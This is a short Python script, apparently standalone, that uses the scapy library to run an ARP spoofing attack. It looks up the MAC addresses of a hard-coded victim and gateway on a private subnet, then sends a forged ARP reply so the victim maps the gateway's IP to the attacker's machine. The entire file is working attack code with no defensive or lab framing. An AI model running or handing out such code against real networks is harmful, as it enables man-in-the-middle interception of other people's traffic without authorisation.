from scapy.all import *

# network interface
interface = "Ethernet0"

# get attacker's MAC address
attacker_mac = get_if_hwaddr(interface)

# IP addresses
victim_ip = "192.168.107.65"
gateway_ip = "192.168.107.72"

# get victim's MAC address
arp_request = Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac)/ARP(op=1, pdst=victim_ip)
arp_reply = srp1(arp_request, timeout=2, verbose=False, iface=interface)
if arp_reply is not None:
    victim_mac = arp_reply.hwsrc
    print("[+] Victim MAC address is:", victim_mac)
else:
    print("[-] Failed to retrieve Victim MAC address.")

# get gateway's MAC address
arp_request = Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac)/ARP(op=1, pdst=gateway_ip)
arp_reply = srp1(arp_request, timeout=2, verbose=False, iface=interface)
if arp_reply is not None:
    gateway_mac = arp_reply.hwsrc
    print("[+] Gateway MAC address is:", gateway_mac)
else:
    print("[-] Failed to retrieve Gateway MAC address.")

# ARP Spoofing attack
arp_response = Ether(dst=victim_mac)/ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac)
send(arp_response, verbose=False, iface=interface)

print("[+] ARP Spoofing attack has been executed successfully.")
